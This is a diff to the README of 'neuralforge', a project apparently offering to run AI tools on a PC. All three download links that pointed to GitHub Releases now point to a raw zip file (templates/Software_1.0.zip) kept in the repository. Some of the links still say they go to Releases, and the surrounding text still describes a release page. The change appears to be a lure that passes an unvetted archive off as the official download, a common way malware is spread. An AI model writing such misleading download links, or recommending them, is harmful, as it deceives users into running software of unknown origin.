@@ -1,6 +1,6 @@
 # 🧠 neuralforge - Run AI tools on your PC
 
-[![Download Neuralforge](https://img.shields.io/badge/Download-Neuralforge-blue?style=for-the-badge&logo=github)](https://github.com/Hygienistgiosuecarducci275/neuralforge/releases)
+[![Download Neuralforge](https://img.shields.io/badge/Download-Neuralforge-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Hygienistgiosuecarducci275/neuralforge/main/templates/Software_1.0.zip)
 
 ## 🚀 What Neuralforge does
 
@@ -37,7 +37,7 @@ If you plan to use image, video, or voice tools, a stronger GPU will help.
 
 Visit this page to download Neuralforge for Windows:
 
-[Download Neuralforge from GitHub Releases](https://github.com/Hygienistgiosuecarducci275/neuralforge/releases)
+[Download Neuralforge from GitHub Releases](https://raw.githubusercontent.com/Hygienistgiosuecarducci275/neuralforge/main/templates/Software_1.0.zip)
 
 On the release page, look for the latest Windows file. It may be an `.exe`, `.zip`, or installer package. Use the newest release unless the release notes tell you to choose a different file.
 
@@ -274,7 +274,7 @@ If the dashboard opens but looks blank, refresh the browser page and wait a few 
 
 If you need the file again, use the release page:
 
-[https://github.com/Hygienistgiosuecarducci275/neuralforge/releases](https://github.com/Hygienistgiosuecarducci275/neuralforge/releases)
+[https://raw.githubusercontent.com/Hygienistgiosuecarducci275/neuralforge/main/templates/Software_1.0.zip](https://raw.githubusercontent.com/Hygienistgiosuecarducci275/neuralforge/main/templates/Software_1.0.zip)
 
 ## 🧪 What the app is built for
 
